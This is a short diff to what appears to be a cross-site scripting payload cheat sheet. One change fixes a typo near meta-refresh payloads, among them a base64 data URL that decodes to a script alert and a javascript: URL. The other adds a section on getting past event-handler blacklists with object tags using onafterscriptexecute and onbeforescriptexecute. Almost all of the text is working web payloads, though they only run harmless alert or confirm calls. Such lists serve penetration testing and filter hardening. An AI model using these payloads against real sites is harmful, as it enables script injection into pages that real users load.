@@ -67,7 +67,7 @@ Base64 encoded
 
 <meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>
 
-With an additionl URL
+With an additional URL
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
 ```
 
@@ -252,6 +252,13 @@ Bypass dot filter
 Bypass parenthesis for string - Firefox
 ```
 alert`1`
+```
+
+
+Bypass onxxxx= blacklist
+```
+<object onafterscriptexecute=confirm(0)>
+<object onbeforescriptexecute=confirm(0)>
 ```
 
 Bypass onxxx= filter with a null byte/vertical tab - IE/Safari
